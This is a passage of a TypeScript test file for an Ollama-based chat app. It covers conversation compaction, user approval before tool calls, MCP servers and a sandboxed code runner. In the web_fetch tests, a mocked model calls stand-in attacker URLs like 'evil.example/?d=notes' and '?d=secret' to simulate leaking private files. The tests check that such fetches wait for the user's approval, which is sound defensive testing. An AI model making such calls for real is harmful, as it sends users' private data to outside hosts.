      expect(second.compaction).toMatchObject({ summary: 'Second summary.', messages: 16 })
      expect(String((calls[1].messages as Array<{ content: string }>)[1].content)).toContain('First summary.')
      // Editing q1, which the summary covers, clears it: the summary stood for the old text.
      const { listMessages } = await import('../src/main/db/conversations')
      const q1 = listMessages(r.conversation.id)[0]
      events.length = 0
      const edited = await service.edit(q1.id, 'q1 reworded', { model: 'llama3.2', think: null })
      await doneEvent(edited.conversation.id)
      expect(edited.conversation.compaction).toBeNull()
    } finally {
      restore()
    }
  })

  /** Every summary request's transcript, in order. */
  const transcripts = (calls: Array<Record<string, unknown>>) =>
    calls.map((call) => String((call.messages as Array<{ content: string }>)[1].content)).join('\n')

  it('summarizes the last exchange too, however many tool calls it made, and replays only the summary', async () => {
    chat = reply('an answer')
    const r = start('q1 look around')
    await doneEvent(r.conversation.id)
    await exchanges(r.conversation.id, ['q2 find stock data', 'q3 carry on'])
    // The last reply is a whole agentic run, as in a code session, with more calls than a message lists.
    const { listMessages } = await import('../src/main/db/conversations')
    updateMessage(listMessages(r.conversation.id).at(-1)!.id, {
      toolEvents: Array.from({ length: 130 }, (_, i) => ({
        tool: 'run_command',
        args: { command: `cargo test step_${i + 1}` },
        ok: true,
        summary: `step ${i + 1} passed`
      }))
    })
    const calls: Array<Record<string, unknown>> = []
    const restore = summarizer(['Three tasks, all done.'], calls)
    try {
      const c = await service.compact(r.conversation.id, { focus: '', model: 'llama3.2' })
      const transcript = transcripts(calls)
      for (const q of ['q1 look around', 'q2 find stock data', 'q3 carry on']) expect(transcript).toContain(`User: ${q}`)
      // It lists its first 40 calls and its last 80, and says how many it left out between them.
      expect(transcript).toContain(
        '→ step 40 passed]\n[… 10 more tool calls]\n[run_command(command: "cargo test step_51") → step 51 passed]'
      )
      expect(transcript).toContain('[run_command(command: "cargo test step_130") → step 130 passed]')
      const messages = listMessages(r.conversation.id)
      expect(c.compaction).toMatchObject({ summary: 'Three tasks, all done.', messages: 6, upTo: messages.at(-1)!.createdAt })
      // The next reply sends the summary and nothing from before it.
      chatCalls = []
      events.length = 0
      const after = service.send({ ...sendBody(r.conversation.id), content: 'q4' })
      await doneEvent(after.conversation.id)
      const sent = chatCalls[0].messages as Array<{ role: string; content: string }>
      expect(sent[0].content).toContain('<earlier_conversation messages="6">')
      expect(sent[0].content).toContain('Three tasks, all done.')
      expect(sent.slice(1).map((m) => m.content)).toEqual(['q4'])
    } finally {
      restore()
    }
  })

  it('keeps every tool call of a long reply and the end of its prose, cutting the middle with a mark', async () => {
    const prose = `${'OPENING'.padEnd(15_000 - ' THE CONCLUSION.'.length, ' filler')} THE CONCLUSION.`
    chat = reply(prose)
    const r = start('research x.io')
    await doneEvent(r.conversation.id)
    chat = reply('an answer')
    await exchanges(r.conversation.id, ['q2', 'q3'])
    const { listMessages } = await import('../src/main/db/conversations')
    const long = listMessages(r.conversation.id)[1]
    expect(long.content).toHaveLength(15_000)
    updateMessage(long.id, {
      toolEvents: Array.from({ length: 30 }, (_, i) => ({
        tool: 'web_fetch',
        args: { url: `https://x.io/${i + 1}` },
        ok: true,
        summary: `Page ${i + 1}`
      }))
    })
    const calls: Array<Record<string, unknown>> = []
    const restore = summarizer(['Researched x.io.'], calls)
    try {
      await service.compact(r.conversation.id, { focus: '', model: 'llama3.2' })
      const transcript = transcripts(calls)
      const lines = transcript.split('\n')
      for (let i = 1; i <= 30; i++) expect(lines).toContain(`[web_fetch(url: "https://x.io/${i}") → Page ${i}]`)
      expect(transcript).toContain('Assistant: OPENING filler')
      expect(transcript).toContain('[… 9000 characters cut …]')
      expect(transcript).toContain('THE CONCLUSION.')
    } finally {
      restore()
    }
  })

  it('gives the summarizer a reply that only called tools, as its tool calls', async () => {
    chat = reply('an answer')
    const r = start('q1')
    await doneEvent(r.conversation.id)
    await waitFor(() => !service.isReplying())
    // Stopped during its one call, the reply saves no prose: the call is all there is of it.
    setApiKey('test-key')
    chat = (_b, res) => void res.writeHead(200).end(toolCall('web_fetch', { url: 'https://tools.io/only' }))
    web = () => undefined // web_fetch never answers
    events.length = 0
    const stopped = service.send({ ...sendBody(r.conversation.id), content: 'q2 read tools.io' })
    await waitFor(() => events.some((e) => e.type === 'tool' && e.event.pending))
    await service.stop(r.conversation.id)
    expect(getMessage(stopped.assistantMessageId)).toMatchObject({
      content: '',
      toolEvents: [expect.objectContaining({ tool: 'web_fetch' })]
    })
    chat = reply('an answer')
    await exchanges(r.conversation.id, ['q3', 'q4'])
    const calls: Array<Record<string, unknown>> = []
    const restore = summarizer(['Four questions.'], calls)
    try {
      const c = await service.compact(r.conversation.id, { focus: '', model: 'llama3.2' })
      expect(transcripts(calls)).toMatch(/User: q2 read tools\.io\n\nAssistant:\n\[web_fetch\(url: "https:\/\/tools\.io\/only"\)/)
      expect(c.compaction?.messages).toBe(8)
    } finally {
      restore()
    }
  })

  it('refuses to compact again with nothing new since the last summary', async () => {
    chat = reply('an answer')
    const r = start('q1')
    await doneEvent(r.conversation.id)
    await exchanges(r.conversation.id, ['q2', 'q3'])
    const restore = summarizer(['A summary.'], [])
    try {
      await service.compact(r.conversation.id, { focus: '', model: 'llama3.2' })
      await expect(service.compact(r.conversation.id, { focus: '', model: 'llama3.2' })).rejects.toThrow(
        'Nothing new to compact since the last summary.'
      )
    } finally {
      restore()
    }
  })

  it('refuses a reply or a second compaction while one runs', async () => {
    chat = reply('an answer')
    const r = start('q1')
    await doneEvent(r.conversation.id)
    await exchanges(r.conversation.id, ['q2', 'q3', 'q4'])
    let release!: () => void
    const gate = new Promise<void>((res) => (release = res))
    const calls: Array<Record<string, unknown>> = []
    const restore = summarizer(['Late summary.'], calls, gate)
    try {
      const running = service.compact(r.conversation.id, { focus: '', model: 'llama3.2' })
      await waitFor(() => calls.length === 1)
      expect(() => service.send({ ...sendBody(r.conversation.id), content: 'q5' })).toThrow(/compacting/i)
      await expect(service.compact(r.conversation.id, { focus: '', model: 'llama3.2' })).rejects.toThrow(/compacting/i)
      release()
      await expect(running).resolves.toMatchObject({ compaction: { summary: 'Late summary.' } })
    } finally {
      restore()
    }
  })

  it('gives up cleanly when the chat is deleted while it compacts', async () => {
    chat = reply('an answer')
    const r = start('q1')
    await doneEvent(r.conversation.id)
    await exchanges(r.conversation.id, ['q2', 'q3', 'q4'])
    let release!: () => void
    const gate = new Promise<void>((res) => (release = res))
    const calls: Array<Record<string, unknown>> = []
    const restore = summarizer(['Too late.'], calls, gate)
    try {
      const running = service.compact(r.conversation.id, { focus: '', model: 'llama3.2' })
      await waitFor(() => calls.length === 1)
      deleteConversation(r.conversation.id)
      release()
      await expect(running).rejects.toThrow(/deleted|gone/i)
    } finally {
      restore()
    }
  })

  it('refuses a summary the model left empty', async () => {
    chat = reply('an answer')
    const r = start('q1')
    await doneEvent(r.conversation.id)
    await exchanges(r.conversation.id, ['q2', 'q3', 'q4'])
    const restore = summarizer(['<think>hmm</think>   '], [])
    try {
      await expect(service.compact(r.conversation.id, { focus: '', model: 'llama3.2' })).rejects.toThrow(/no summary/i)
    } finally {
      restore()
    }
  })

  it('refuses a chat with nothing in it yet', async () => {
    const empty = createConversation({ projectId: null, model: 'llama3.2', think: null, skills: [], toolSources: [] })
    await expect(service.compact(empty.id, { focus: '', model: 'llama3.2' })).rejects.toThrow('Nothing to compact yet.')
  })

  it('when the last reply failed, upTo is the user message it never answered', async () => {
    chat = reply('an answer')
    const r = start('q1')
    await doneEvent(r.conversation.id)
    // The last exchange's reply fails and saves no content, so the filter that drops it also drops it from `since`.
    chat = (_b, res) => void res.writeHead(500).end('boom')
    await exchanges(r.conversation.id, ['q2'])
    const calls: Array<Record<string, unknown>> = []
    const restore = summarizer(['One question answered.'], calls)
    try {
      const c = await service.compact(r.conversation.id, { focus: '', model: 'llama3.2' })
      const { listMessages } = await import('../src/main/db/conversations')
      const q2 = listMessages(r.conversation.id).find((m) => m.content === 'q2')!
      expect(c.compaction).toMatchObject({ messages: 3, upTo: q2.createdAt })
    } finally {
      restore()
    }
  })

  it('cuts a single tool call’s line at the 300-character cap', async () => {
    chat = reply('ok')
    const r = start('q1')
    await doneEvent(r.conversation.id)
    const { listMessages } = await import('../src/main/db/conversations')
    const a1 = listMessages(r.conversation.id)[1]
    updateMessage(a1.id, { toolEvents: [{ tool: 'run_command', args: { command: 'x' }, ok: true, summary: 'y'.repeat(400) }] })
    const calls: Array<Record<string, unknown>> = []
    const restore = summarizer(['Summary.'], calls)
    try {
      await service.compact(r.conversation.id, { focus: '', model: 'llama3.2' })
      const callLine = transcripts(calls)
        .split('\n')
        .find((l) => l.startsWith('[run_command'))!
      expect(callLine).toHaveLength(300)
      expect(callLine.endsWith('…')).toBe(true)
    } finally {
      restore()
    }
  })

  it('cuts the middle of a single reply too big for the whole piece, keeping its first and last tool calls', async () => {
    chat = reply('a short reply')
    const r = start('research many pages')
    await doneEvent(r.conversation.id)
    const { listMessages } = await import('../src/main/db/conversations')
    const a1 = listMessages(r.conversation.id)[1]
    updateMessage(a1.id, {
      toolEvents: Array.from({ length: 120 }, (_, i) => ({
        tool: 'web_fetch',
        args: { url: `https://x.io/page-${i + 1}` },
        ok: true,
        summary: `Fetched page ${i + 1} of the crawl. ${'x'.repeat(150)}`
      }))
    })
    // A model name never fetched before, so its info isn't the 8192-token one other tests already cached for
    // llama3.2: a small window pins this well below the ~27,000-character line the 120 calls add up to.
    const base = ollama.handler
    ollama.handler = (req, res) => {
      if (req.url === '/api/show' && req.json.model === 'tiny-window')
        return res
          .writeHead(200)
          .end(JSON.stringify({ capabilities: ['completion', 'tools'], model_info: { 'llama.context_length': 2048 } }))
      return base!(req, res)
    }
    const calls: Array<Record<string, unknown>> = []
    const restore = summarizer(['Summary.'], calls)
    try {
      await service.compact(r.conversation.id, { focus: '', model: 'tiny-window' })
      const transcript = transcripts(calls)
      expect(transcript).toMatch(/\[… \d+ characters cut to fit …\]/)
      expect(transcript).toContain('https://x.io/page-1"')
      expect(transcript).toContain('https://x.io/page-120"')
    } finally {
      restore()
      ollama.handler = base
    }
  })
})

describe('asking before a tool runs', () => {
  // A tool that acts on this Mac: it asks first, and records each run.
  const runs: Array<Record<string, unknown>> = []
  let unregister: () => void
  beforeAll(() => {
    unregister = registerToolProvider({
      id: 'notes',
      tools: () => [
        { type: 'function', function: { name: 'notes__delete', description: 'Delete a note', parameters: { type: 'object' } } }
      ],
      pending: ({ name, args }) => ({ tool: name, args, ok: true, pending: true, summary: `note ${String(args.id)}` }),
      run: async ({ name, args }) => {
        runs.push(args)
        return { content: `Deleted note ${String(args.id)}.`, event: { tool: name, args, ok: true, summary: `note ${String(args.id)}` } }
      },
      approval: () => 'ask'
    })
  })
  let unregisterArchive: (() => void) | null = null
  afterAll(() => unregister())
  beforeEach(() => {
    runs.length = 0
  })
  afterEach(() => {
    unregisterArchive?.()
    unregisterArchive = null
  })

  const deleteThenAnswer: ChatHandler = (b, res, n) =>
    n === 1 ? void res.writeHead(200).end(toolCall('notes__delete', { id: 7 })) : reply('Done.')(b, res, n)
  const toolEvents = (conversationId: string) =>
    events.filter((e): e is Extract<ChatEvent, { type: 'tool' }> => e.type === 'tool' && e.conversationId === conversationId)
  const waiting = (conversationId: string) => waitFor(() => toolEvents(conversationId).find((e) => e.event.awaiting))
  const toolMessages = (call: Record<string, unknown>) =>
    (call.messages as Array<{ role: string; content: string }>).filter((m) => m.role === 'tool').map((m) => m.content)

  it('waits for an answer, saving the waiting call at once, and runs it on Allow once', async () => {
    chat = deleteThenAnswer
    const r = start('delete note 7')
    const ask = await waiting(r.conversation.id)
    await new Promise((resolve) => setTimeout(resolve, 50))
    expect(runs).toHaveLength(0)
    expect(chatCalls).toHaveLength(1)
    // Saved straight away (not on the next throttled checkpoint), so a crash keeps the question.
    expect(getMessage(r.assistantMessageId)!.toolEvents[0]).toMatchObject({ tool: 'notes__delete', awaiting: true })
    expect(approvals.waitingCount()).toBe(1)

    approvals.decide(r.conversation.id, ask.messageId, ask.index, 'once')
    const done = await doneEvent(r.conversation.id)
    expect(runs).toEqual([{ id: 7 }])
    expect(toolMessages(chatCalls[1])).toEqual(['Deleted note 7.'])
    expect(done.message.toolEvents[0]).toMatchObject({ tool: 'notes__delete', ok: true })
    expect(done.message.toolEvents[0].awaiting).toBeUndefined()
    expect(approvals.waitingCount()).toBe(0)
    // Once only: the chat didn't start allowing it.
    expect(getConversation(r.conversation.id)!.allowedTools).toEqual([])
  })

  it("tells the model a denied call didn't run, and doesn't ask again in the same reply", async () => {
    // The model tries again after the denial; the second call is declined without asking.
    chat = (b, res, n) =>
      n <= 2 ? void res.writeHead(200).end(toolCall('notes__delete', { id: n })) : reply('I could not delete it.')(b, res, n)
    const r = start('delete note 1')
    const ask = await waiting(r.conversation.id)
    approvals.decide(r.conversation.id, ask.messageId, ask.index, 'deny')
    const done = await doneEvent(r.conversation.id)
    expect(runs).toHaveLength(0)
    expect(toolMessages(chatCalls[1])[0]).toMatch(/The user declined to run notes__delete, so it didn't run/)
    expect(toolEvents(r.conversation.id).filter((e) => e.event.awaiting)).toHaveLength(1)
    expect(done.message.toolEvents.map((e) => [e.ok, e.declined])).toEqual([
      [false, true],
      [false, true]
    ])
    const trace = listTraces(r.conversation.id).find((t) => t.kind === 'tool')
    expect(trace?.summary).toBe('notes__delete: declined by you')
  })

  it('remembers Allow for this chat, so later calls in the chat run without asking', async () => {
    chat = deleteThenAnswer
    const r = start('delete note 7')
    const ask = await waiting(r.conversation.id)
    approvals.decide(r.conversation.id, ask.messageId, ask.index, 'chat')
    await doneEvent(r.conversation.id)
    expect(getConversation(r.conversation.id)!.allowedTools).toEqual(['notes__delete'])

    events.length = 0
    chatCalls = []
    service.send({
      conversationId: r.conversation.id,
      projectId: null,
      content: 'and again',
      attachmentIds: [],
      model: 'llama3.2',
      think: null,
      skills: [],
      toolSources: []
    })
    await doneEvent(r.conversation.id)
    expect(runs).toHaveLength(2)
    expect(toolEvents(r.conversation.id).some((e) => e.event.awaiting)).toBe(false)
  })

  it('never runs a call that was waiting when the reply was stopped', async () => {
    chat = deleteThenAnswer
    const r = start('delete note 7')
    const ask = await waiting(r.conversation.id)
    await service.stop(r.conversation.id)
    const saved = getMessage(r.assistantMessageId)!
    expect(runs).toHaveLength(0)
    expect(saved.error).toBeNull()
    expect(saved.toolEvents[0]).toMatchObject({ ok: false, pending: false, summary: 'note 7 (not run)' })
    expect(saved.toolEvents[0].awaiting).toBeUndefined()
    expect(approvals.waitingCount()).toBe(0)
    // Too late to answer now.
    expect(() => approvals.decide(r.conversation.id, ask.messageId, ask.index, 'once')).toThrow(/isn't waiting/)
    expect(listTraces(r.conversation.id).every((t) => t.status !== 'running')).toBe(true)
  })

  it('lets a chat be deleted while a call waits for an answer', async () => {
    chat = deleteThenAnswer
    const r = start('delete note 7')
    await waiting(r.conversation.id)
    await service.stopAll((id) => id === r.conversation.id) // as deleting a chat or project does
    deleteConversation(r.conversation.id)
    expect(service.isReplying()).toBe(false)
    expect(runs).toHaveLength(0)
  })

  it('reads what the chat allows at each call, so a reset mid-reply holds and a later answer does not undo it', async () => {
    // notes__delete was allowed for the chat. The model first calls notes__archive (which asks); while that waits, the
    // user picks "Ask again before each tool". Allowing notes__archive for the chat must not bring notes__delete back,
    // and the model's next notes__delete must ask.
    unregisterArchive = registerToolProvider({
      id: 'archive',
      tools: () => [
        { type: 'function', function: { name: 'notes__archive', description: 'Archive a note', parameters: { type: 'object' } } }
      ],
      pending: ({ name, args }) => ({ tool: name, args, ok: true, pending: true, summary: `note ${String(args.id)}` }),
      run: async ({ name, args }) => ({ content: 'Archived.', event: { tool: name, args, ok: true, summary: 'archived' } })
    })
    chat = (b, res, n) =>
      n === 1
        ? void res.writeHead(200).end(toolCall('notes__archive', { id: 1 }))
        : n === 2
          ? void res.writeHead(200).end(toolCall('notes__delete', { id: 2 }))
          : reply('Done.')(b, res, n)
    const r = start('tidy up')
    updateConversation(r.conversation.id, { allowedTools: ['notes__delete'] })
    const first = await waiting(r.conversation.id)
    expect(first.event.tool).toBe('notes__archive')
    updateConversation(r.conversation.id, { allowedTools: [] }) // "Ask again before each tool"
    approvals.decide(r.conversation.id, first.messageId, first.index, 'chat')

    const second = await waitFor(() => toolEvents(r.conversation.id).find((e) => e.event.awaiting && e.event.tool === 'notes__delete'))
    expect(runs).toHaveLength(0)
    expect(getConversation(r.conversation.id)!.allowedTools).toEqual(['notes__archive'])
    approvals.decide(r.conversation.id, second.messageId, second.index, 'deny')
    await doneEvent(r.conversation.id)
    expect(runs).toHaveLength(0)
  })

  it('asks for a tool whose provider does not say, and never runs it unasked', async () => {
    unregisterArchive = registerToolProvider({
      id: 'archive',
      tools: () => [
        { type: 'function', function: { name: 'notes__archive', description: 'Archive a note', parameters: { type: 'object' } } }
      ],
      pending: ({ name, args }) => ({ tool: name, args, ok: true, pending: true, summary: 'archive' }),
      run: async () => {
        throw new Error('ran without asking')
      }
    })
    chat = (b, res, n) => (n === 1 ? void res.writeHead(200).end(toolCall('notes__archive', {})) : reply('Done.')(b, res, n))
    const r = start('archive it')
    const ask = await waiting(r.conversation.id)
    approvals.decide(r.conversation.id, ask.messageId, ask.index, 'deny')
    const done = await doneEvent(r.conversation.id)
    expect(done.message.toolEvents[0]).toMatchObject({ tool: 'notes__archive', declined: true })
  })

  it('only takes one of the three answers, for the chat the call is in', async () => {
    chat = deleteThenAnswer
    const r = start('delete note 7')
    const ask = await waiting(r.conversation.id)
    expect(() => approvals.decide(r.conversation.id, ask.messageId, ask.index, 'yes' as never)).toThrow(/Unknown answer/)
    expect(() => approvals.decide('another-chat', ask.messageId, ask.index, 'once')).toThrow(/isn't waiting/)
    expect(runs).toHaveLength(0)
    approvals.decide(r.conversation.id, ask.messageId, ask.index, 'deny')
    await doneEvent(r.conversation.id)
  })
})

describe('MCP servers in a reply', () => {
  const FIXTURE = new URL('./fixtures/mcp-server.mjs', import.meta.url).pathname
  afterAll(() => mcpManager.stopAll())
  const sendIn = (conversationId: string | null, content: string, toolSources: string[]) =>
    service.send({ conversationId, projectId: null, content, attachmentIds: [], model: 'llama3.2', think: null, skills: [], toolSources })
  const tools = (call: Record<string, unknown>) => ((call.tools as Array<{ function: { name: string } }>) ?? []).map((t) => t.function.name)

  it("offers the chat's servers, asks before a call, and gives the model the result", async () => {
    const server = mcpConfig.saveServer({
      name: 'Fixture',
      command: process.execPath,
      args: [FIXTURE],
      cwd: null,
      env: {},
      defaultOn: true
    })
    chat = (b, res, n) => (n === 1 ? void res.writeHead(200).end(toolCall('fixture__echo', { text: 'hi' })) : reply('Done.')(b, res, n))
    const r = sendIn(null, 'echo hi', [`mcp:${server.id}`])
    expect(getConversation(r.conversation.id)!.toolSources).toEqual(['mcp:fixture'])
    const ask = await waitFor(() =>
      events.find(
        (e): e is Extract<ChatEvent, { type: 'tool' }> => e.type === 'tool' && e.conversationId === r.conversation.id && !!e.event.awaiting
      )
    )
    expect(ask.event).toMatchObject({ tool: 'fixture__echo', source: 'Fixture', summary: 'hi' })
    expect(tools(chatCalls[0])).toContain('fixture__lookup_codename')
    expect((chatCalls[0].messages as Array<{ content: string }>)[0].content).toMatch(/MCP servers \(Fixture\)/)

    approvals.decide(r.conversation.id, ask.messageId, ask.index, 'once')
    const done = await doneEvent(r.conversation.id)
    const results = (chatCalls[1].messages as Array<{ role: string; content: string }>).filter((m) => m.role === 'tool')
    expect(results.map((m) => m.content)).toEqual(['echo: hi'])
    expect(done.message.toolEvents[0]).toMatchObject({ tool: 'fixture__echo', ok: true, source: 'Fixture' })
    // A chat with tool sources gets more rounds; its debugger trace names the server.
    const trace = listTraces(r.conversation.id).find((t) => t.kind === 'tool')!
    expect(trace.summary).toBe('fixture__echo: hi')

    // Switched off on the next message: no MCP tools, and no MCP section in the prompt.
    events.length = 0
    chatCalls = []
    chat = reply('Plain answer.')
    sendIn(r.conversation.id, 'no tools now', [])
    await doneEvent(r.conversation.id)
    expect(tools(chatCalls[0])).not.toContain('fixture__echo')
    expect((chatCalls[0].messages as Array<{ content: string }>)[0].content).not.toMatch(/mcp_tools/)
  })

  it("says which of the chat's servers couldn't be used", async () => {
    const broken = mcpConfig.saveServer({
      name: 'Broken',
      command: 'ollmost-no-such-server',
      args: [],
      cwd: null,
      env: {},
      defaultOn: false
    })
    chat = reply('Answered without it.')
    const r = sendIn(null, 'hello', [`mcp:${broken.id}`])
    const done = await doneEvent(r.conversation.id)
    expect(done.message.content).toBe('Answered without it.')
    expect(done.message.stats?.unavailableTools).toEqual([
      expect.stringMatching(/^Broken couldn't start: Couldn't find "ollmost-no-such-server"/)
    ])
    expect(chatCalls[0].tools).toBeUndefined()
  })
})

describe('web_fetch in a chat with files in it', () => {
  const fetchCall = (url: string) =>
    line({
      message: { role: 'assistant', content: '', tool_calls: [{ function: { name: 'web_fetch', arguments: { url } } }] },
      done: false
    }) + line({ done: true })
  const sendWith = (attachmentIds: string[]) =>
    service.send({
      conversationId: null,
      projectId: null,
      content: 'look this up',
      attachmentIds,
      model: 'llama3.2',
      think: null,
      skills: [],
      toolSources: []
    })
  const asks = (conversationId: string) =>
    events.filter(
      (e): e is Extract<ChatEvent, { type: 'tool' }> => e.type === 'tool' && e.conversationId === conversationId && !!e.event.awaiting
    )
  let fetched: string[]
  beforeEach(() => {
    setApiKey('test-key')
    fetched = []
    web = (path, res) => {
      fetched.push(path)
      res.writeHead(200).end(JSON.stringify({ title: 'Page', content: 'hello', links: [] }))
    }
    chat = (b, res, n) => (n === 1 ? void res.writeHead(200).end(fetchCall('https://evil.example/?d=notes')) : reply('Done.')(b, res, n))
  })

  it('asks before every fetch when the chat has an attachment, fetching nothing before the answer', async () => {
    const file = insertAttachment({
      id: 'att-private',
      kind: 'text',
      name: 'notes.txt',
      mime: 'text/plain',
      size: 12,
      path: join(paths.data, 'files', 'notes.txt'),
      text: 'private notes',
      token_est: 3
    })
    const r = sendWith([file.id])
    const ask = await waitFor(() => asks(r.conversation.id)[0])
    expect(ask.event).toMatchObject({ tool: 'web_fetch', everyTime: true })
    expect(fetched).toHaveLength(0)
    expect(() => approvals.decide(r.conversation.id, ask.messageId, ask.index, 'chat')).toThrow(/only be allowed once or denied/)
    approvals.decide(r.conversation.id, ask.messageId, ask.index, 'deny')
    await doneEvent(r.conversation.id)
    expect(fetched).toHaveLength(0)
  })

  it('fetches without asking in a chat with no tools and no files', async () => {
    const r = sendWith([])
    await doneEvent(r.conversation.id)
    expect(asks(r.conversation.id)).toHaveLength(0)
    expect(fetched).toHaveLength(1)
  })
})

describe('web_fetch in a chat with MCP servers', () => {
  const FIXTURE = new URL('./fixtures/mcp-server.mjs', import.meta.url).pathname
  afterAll(() => mcpManager.stopAll())

  it('asks before every fetch, takes only Allow once or Deny, and fetches nothing before the answer', async () => {
    setApiKey('test-key')
    const server = mcpConfig.saveServer({
      name: 'Fetchy',
      command: process.execPath,
      args: [FIXTURE],
      cwd: null,
      env: {},
      defaultOn: false
    })
    const fetched: string[] = []
    web = (path, res) => {
      fetched.push(path)
      res.writeHead(200).end(JSON.stringify({ title: 'Page', content: 'hello', links: [] }))
    }
    const fetchCall = (url: string) =>
      line({
        message: { role: 'assistant', content: '', tool_calls: [{ function: { name: 'web_fetch', arguments: { url } } }] },
        done: false
      }) + line({ done: true })
    chat = (b, res, n) =>
      n === 1
        ? void res.writeHead(200).end(fetchCall('https://evil.example/exec?q=weather'))
        : n === 2
          ? void res.writeHead(200).end(fetchCall('https://evil.example/exec?d=secret'))
          : reply('Done.')(b, res, n)
    const r = service.send({
      conversationId: null,
      projectId: null,
      content: 'check the weather',
      attachmentIds: [],
      model: 'llama3.2',
      think: null,
      skills: [],
      toolSources: [`mcp:${server.id}`]
    })
    const asks = () =>
      events.filter(
        (e): e is Extract<ChatEvent, { type: 'tool' }> => e.type === 'tool' && e.conversationId === r.conversation.id && !!e.event.awaiting
      )
    const first = await waitFor(() => asks()[0])
    expect(first.event).toMatchObject({ tool: 'web_fetch', everyTime: true })
    expect(fetched).toHaveLength(0)
    // "Allow for this chat" isn't an answer this call takes, even if the renderer sent it.
    expect(() => approvals.decide(r.conversation.id, first.messageId, first.index, 'chat')).toThrow(/only be allowed once or denied/)
    approvals.decide(r.conversation.id, first.messageId, first.index, 'once')

    // The next URL on the same site asks again.
    const second = await waitFor(() => asks()[1])
    expect(second.event.summary).toContain('d=secret')
    expect(fetched).toHaveLength(1)
    approvals.decide(r.conversation.id, second.messageId, second.index, 'deny')
    await doneEvent(r.conversation.id)
    expect(fetched).toHaveLength(1)
    expect(getConversation(r.conversation.id)!.allowedTools).toEqual([])
    mcpConfig.removeServer(server.id)
  })
})

// The sandbox is macOS's; CI runs on Linux.
describe.runIf(process.platform === 'darwin')('the code runner in a reply', () => {
  it('prepares the chat’s folder, asks before running, and gives the model what the code printed', async () => {
    const { paths } = await import('../src/main/paths')
    const { mkdtempSync } = await import('node:fs')
    const { tmpdir } = await import('node:os')
    const { join } = await import('node:path')
    const dir = mkdtempSync(join(tmpdir(), 'ollmost-service-runner-'))
    paths.workspaces = join(dir, 'workspaces')
    paths.runner = join(dir, 'runner')
    chat = (b, res, n) =>
      n === 1
        ? void res.writeHead(200).end(toolCall('run_code', { language: 'python', code: 'print(21 * 2)' }))
        : reply('It is 42.')(b, res, n)
    const r = service.send({
      conversationId: null,
      projectId: null,
      content: 'what is 21*2? use code',
      attachmentIds: [],
      model: 'llama3.2',
      think: null,
      skills: [],
      toolSources: ['code']
    })
    const ask = await waitFor(
      () =>
        events.find(
          (e): e is Extract<ChatEvent, { type: 'tool' }> =>
            e.type === 'tool' && e.conversationId === r.conversation.id && !!e.event.awaiting
        ),
      30_000
    )
    const system = (chatCalls[0].messages as Array<{ content: string }>)[0].content
    expect(system).toMatch(/<code_runner>/)
    expect(system).not.toMatch(/You cannot run code/)
    expect(((chatCalls[0].tools as Array<{ function: { name: string } }>) ?? []).map((t) => t.function.name)).toContain('run_code')
    approvals.decide(r.conversation.id, ask.messageId, ask.index, 'once')
    const done = await waitFor(
      () => events.find((e): e is Extract<ChatEvent, { type: 'done' }> => e.type === 'done' && e.conversationId === r.conversation.id),
      60_000
    )
    const results = (chatCalls[1].messages as Array<{ role: string; content: string }>).filter((m) => m.role === 'tool')
    expect(results[0].content).toMatch(/^Exit code 0\.\n\n42/)
    expect(done.message.toolEvents[0]).toMatchObject({ tool: 'run_code', ok: true })
  }, 120_000)

  // #88: a code session's reply works in the user's folder with run_command, under the session's prompt.
  it('offers only reading in plan mode, and the approved plan once the user starts working', async () => {
    const { paths } = await import('../src/main/paths')
    const { mkdtempSync, realpathSync } = await import('node:fs')
    const { tmpdir } = await import('node:os')
    const { join } = await import('node:path')
    const dir = mkdtempSync(join(tmpdir(), 'ollmost-service-plan-'))
    paths.workspaces = join(dir, 'workspaces')
    paths.runner = join(dir, 'runner')
    const folder = realpathSync(mkdtempSync(join(tmpdir(), 'ollmost-user-repo-')))
    const session = createConversation({
      projectId: null,
      model: 'llama3.2',
      think: null,
      skills: [],
      mode: 'code',
      root: folder,
      title: 'repo'
    })
    expect(session).toMatchObject({ stage: 'work', plan: null })
    expect(service.setStage(session.id, 'plan')).toMatchObject({ stage: 'plan', plan: null })
    const plan = 'Plan: 1. Read README.md. 2. Change the greeting. 3. Run the tests.'
    chat = reply(plan)
    const r = service.send({ ...sendBody(session.id), content: 'plan a greeting change' })
    await doneEvent(r.conversation.id)
    const offered = (calls: number) => ((chatCalls[calls].tools as Array<{ function: { name: string } }>) ?? []).map((t) => t.function.name)
    expect(offered(0)).toEqual(['read_file', 'list_files', 'search_files', 'delegate'])
    const system = (chatCalls[0].messages as Array<{ content: string }>)[0].content
    expect(system).toMatch(/<plan_mode>/)
    expect(system).not.toMatch(/<approved_plan>/)
    // The working rules don't tell it to edit and run while it can't.
    expect(system).not.toMatch(/edit_file replaces one exact passage/)
    expect(system).toMatch(/read_file/)
    // The plan is the reply written in plan mode, kept as it finishes; starting work keeps it, and the next reply has
    // every tool and the plan in front of it.
    await waitFor(() => !service.isReplying())
    expect(getConversation(session.id)?.plan).toBe(plan)
    expect(service.setStage(session.id, 'work')).toMatchObject({ stage: 'work', plan })
    chat = reply('Doing it.')
    events.length = 0
    const next = service.send({ ...sendBody(session.id), content: 'go ahead' })
    await doneEvent(next.conversation.id)
    expect(offered(1)).toEqual(['read_file', 'list_files', 'search_files', 'edit_file', 'write_file', 'run_command', 'delegate'])
    const later = (chatCalls[1].messages as Array<{ content: string }>)[0].content
    expect(later).toMatch(/<approved_plan>[\s\S]*Change the greeting[\s\S]*<\/approved_plan>/)
    expect(later).not.toMatch(/<plan_mode>/)
    // Back to planning drops the approved plan: a new one will come.
    await waitFor(() => !service.isReplying())
    expect(service.setStage(session.id, 'plan')).toMatchObject({ stage: 'plan', plan: null })
  })

  it('keeps no plan when nothing was written in plan mode, and none of a chat', async () => {
    const { paths } = await import('../src/main/paths')
    const { mkdtempSync, realpathSync } = await import('node:fs')
    const { tmpdir } = await import('node:os')
    const { join } = await import('node:path')
    const dir = mkdtempSync(join(tmpdir(), 'ollmost-service-plan-'))
    paths.workspaces = join(dir, 'workspaces')
    paths.runner = join(dir, 'runner')
    const folder = realpathSync(mkdtempSync(join(tmpdir(), 'ollmost-user-repo-')))
    const session = createConversation({
      projectId: null,
      model: 'llama3.2',
      think: null,
      skills: [],
      mode: 'code',
      root: folder,
      title: 'repo'
    })
    chat = reply('I renamed foo to bar and the tests pass.')
    const r = service.send({ ...sendBody(session.id), content: 'rename foo' })
    await doneEvent(r.conversation.id)
    await waitFor(() => !service.isReplying())
    // A work report is no plan: going to Plan and back keeps nothing, and the next reply isn't told to carry it out.
    expect(service.setStage(session.id, 'plan')).toMatchObject({ stage: 'plan', plan: null })
